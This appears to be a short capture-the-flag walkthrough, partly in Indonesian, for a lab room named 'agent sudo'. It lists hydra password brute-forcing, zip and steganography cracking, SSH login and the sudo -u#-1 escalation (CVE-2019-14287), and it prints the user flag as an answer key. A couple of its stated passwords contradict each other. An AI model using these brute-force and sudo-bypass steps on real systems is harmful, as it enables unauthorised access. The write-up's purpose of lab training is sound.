# agent sudo

## Task 1 Author note
- deploy

## Task 2 Enumerate
- How many open ports? 3
- How you redirect yourself to a secret page? 
- What is the agent name? user-agent
  ```
  use burp suite and add user-agent: R
  ```
- What is the agent name? chris
  ```
  use burp suite and add user-agent a, lalu b, lalu c
  ```

## Task 3 Hash cracking and brute-force
- FTP password? cystal
  ```
  hydra -l chris -P rockyou.txt ftp://10.10.80.126

  user: chris
  pass: crystal
  ```
- Zip file password? alien
  ```
  exiftool cutie.png
  xxd cutie.png
  strings cutie.png
  binwalk cutie.png

  zip2john 8702.zip > hash.txt
  john hash.txt
  ```
- steg password? area51
  ```
  7z e 8702.zip
  cat Agent_R

  decode enkripsi

  area51
  ```
- Who is the other agent (in full name)? james
  ```
  steghide extract -sf cute-alien.jpg
  pass: area51

  cat message.txt

  from james
  pass hackerrules
  ```
- SSH password? hackerrules

## Task 4 Capture the user flag
- What is the user flag? b03d975e8c92a7c04146cfa7a5a313c7
  ```
  ssh james@10.10.80.126
  pass: hackerrules!

  cat user_flag.txt
  b03d975e8c92a7c04146cfa7a5a313c7
  ```
- What is the incident of the photo called? Roswell alien autopsy
  ```
  sudo scp james@10.10.80.126:Alien_autospy.jpg ~/

  find in goggle gambarnya
  dan nantinya akan muncul gambar terbalik

  Roswell alien autopsy
  ```

## Task 5 Privilege escalation
- CVE number for the escalation (Format: CVE-xxxx-xxxx)? CVE-2019–14287
  ```
  sudo -l
  (ALL, !root) /bin/bash

  u can search in google (ALL, !root) /bin/bash exploit
  ```
- What is the root flag?
  ```
  baca dokumentasi cv nya lalu liat di bagian
  sudo -u#-1 /bin/bash

  cat /root/root.txt
  ```